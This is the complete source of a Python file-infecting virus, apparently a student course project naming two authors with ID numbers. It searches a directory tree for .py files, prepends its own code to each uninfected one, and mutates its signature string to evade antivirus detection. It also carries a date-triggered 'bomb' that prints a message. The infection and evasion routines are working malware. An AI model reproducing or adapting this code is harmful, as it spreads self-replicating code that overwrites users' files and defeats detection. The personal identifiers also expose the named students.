# pythonVirus.py
# implemented polymorphism to avoid detection by AV.py
# Mano Wared 913398346
# Patrick Ong 997520004

import os
import datetime
import random
SIGNATURE = "CRANKLIN PYTHON VIRUS"

def morph():
    newsig = 'SIGNATURE = "CRANKLIN '
    random.seed()
    num = random.randint(0,1)
    if not num:
        newsig += str(random.randint(-1000,1000))
        newsig += " PYTHON VIRUS"
    else:
        newsig += "PYTHON "
        newsig += str(random.randint(-1000,1000))
        newsig += " VIRUS"
    return newsig

def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if "CRANKLIN" in line and "PYTHON" in line and "VIRUS" in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <63:
            if "CRANKLIN" in line and "PYTHON" in line and "VIRUS" in line:
                virusstring += morph()
            else:
                virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
        print "HAPPY BIRTHDAY CRANKLIN!"
filestoinfect = search(os.path.abspath("/home/prong/Documents/ECS189m/project1"))
infect(filestoinfect)
bomb()
